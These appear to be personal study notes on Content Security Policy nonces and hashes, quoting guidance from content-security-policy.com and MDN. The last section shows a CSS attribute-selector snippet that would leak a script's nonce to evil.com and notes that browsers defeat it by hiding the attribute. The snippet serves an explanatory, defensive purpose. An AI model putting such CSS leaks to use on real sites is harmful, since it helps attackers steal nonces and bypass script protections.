# Browser security: CSP/nonce

## CSP Nonce ⟶ Script & Style Attribute

- https://content-security-policy.com/nonce/

The HTML `<style>` tag can also accept the nonce attribute. Because CSS styles can also be used to load or request resources or potentially execute client side code, inline style tags are also blocked by default once a CSP policy is enabled.

An alternative to using a CSP nonce, is the CSP hash.

The nonce must be unique for each HTTP response

The nonce should be generated using a cryptographically secure random generator

The nonce should have sufficient length

## CSP Hash Examples and Guide

- https://content-security-policy.com/hash/

```html
<script src="https://code.jquery.com/jquery-3.7.1.min.js"
	integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
	crossorigin="anonymous"></script>
```

## nonce - HTML: HyperText Markup Language | MDN

- https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Global_attributes/nonce

For security reasons, the `nonce` content attribute is hidden (an empty string will be returned).

So

```css
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

would not work.

But `script.nonce` property exists (???)